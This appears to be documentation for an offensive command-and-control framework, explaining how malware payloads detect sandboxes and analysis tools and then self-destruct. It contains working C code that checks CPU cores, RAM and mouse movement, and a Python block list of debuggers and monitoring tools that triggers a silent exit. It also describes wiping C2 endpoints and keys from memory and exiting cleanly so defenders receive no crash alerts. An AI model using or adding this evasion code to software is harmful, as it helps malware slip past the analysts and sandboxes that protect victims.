# 🛑 Anti-Analysis, Sandbox Evasion & Kill Switches

Adversary payloads frequently incorporate environmental checks to determine whether they are running on a genuine victim workstation or inside an automated malware analysis sandbox (e.g., Cuckoo, Any.run, Joe Sandbox, Windows Defender sandbox).

---

### Environmental Heuristics & Verification

```text
                     +---------------------------------------+
                     |         Payload Invoked in RAM        |
                     +---------------------------------------+
                                         │
        ┌────────────────────────────────┼──────────────────────────────┐
        ▼                                ▼                              ▼
[Hardware Constraints]          [User Activity Check]          [Debugger & Analysis APIs]
• CPU Cores >= 4                • Cursor movement delta        • IsDebuggerPresent()
• RAM >= 4 GB                   • System Uptime > 20 mins      • Process list scan
• Screen Resolution >= 1080p    • Recent files accessed        • NtQueryInformationProcess
        │                                │                              │
        └────────────────────────────────┼──────────────────────────────┘
                                         │
                   Any Environmental Red Flags Detected?
                                  /     \
                            YES  /       \  NO
                                v         v
              [Emergency Memory Purge]   [Execute Covert Mission]
              [Clean sys.exit(0)]
```

---

### Core Anti-Analysis Checks

#### 1. Hardware & System Heuristics

```c
#include <windows.h>
#include <stdio.h>

BOOL IsRealHardware() {
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);

    // Most automated sandboxes allocate only 1 or 2 CPU cores
    if (sysInfo.dwNumberOfProcessors < 4) {
        return FALSE;
    }

    // Check physical RAM (sandboxes often allocate < 4GB)
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);
    if ((memStatus.ullTotalPhys / (1024 * 1024 * 1024)) < 4) {
        return FALSE;
    }

    return TRUE;
}
```

#### 2. User Interaction & Mouse Movement
Automated sandboxes rarely simulate realistic, curved human mouse movements. Checking cursor position changes over time differentiates real users from headless execution:

```c
BOOL CheckUserPresence() {
    POINT pt1, pt2;
    GetCursorPos(&pt1);
    Sleep(5000); // Wait 5 seconds
    GetCursorPos(&pt2);

    // If mouse coordinates are identical, likely an automated headless sandbox
    if (pt1.x == pt2.x && pt1.y == pt2.y) {
        return FALSE;
    }
    return TRUE;
}
```

#### 3. Process Blacklist Inspection
As implemented in Haridev's Stealth-C2 framework:

```python
import sys
import psutil

ANALYSIS_PROCESSES = {
    "wireshark.exe", "tshark.exe", "dumpcap.exe", "procmon.exe", "procmon64.exe",
    "procexp.exe", "x64dbg.exe", "x32dbg.exe", "ida.exe", "ida64.exe",
    "pestudio.exe", "fiddler.exe", "tcpview.exe", "cuckoomon.dll"
}

def verify_safe_environment():
    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'].lower() in ANALYSIS_PROCESSES:
                # Terminate silently to avoid triggering automated sandbox alerts
                sys.exit(0)
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return True
```

---

### The Self-Destruct & Memory Purge Mechanism

When an adversary agent determines the environment is compromised:
1. **Memory Buffer Nullification**: Overwrites all sensitive variables, decrypted commands, encryption keys, and C2 endpoints in memory using `SecureZeroMemory` or iterating with null bytes (`0x00`).
2. **Handle Closure**: Closes all active socket connections, file handles, and mutexes cleanly.
3. **Exit Code 0**: Terminates with a clean status code `0`. An exit code error or unhandled exception generates crash dumps (`.dmp`) and Windows Error Reporting (WER) events that immediately alert defenders.
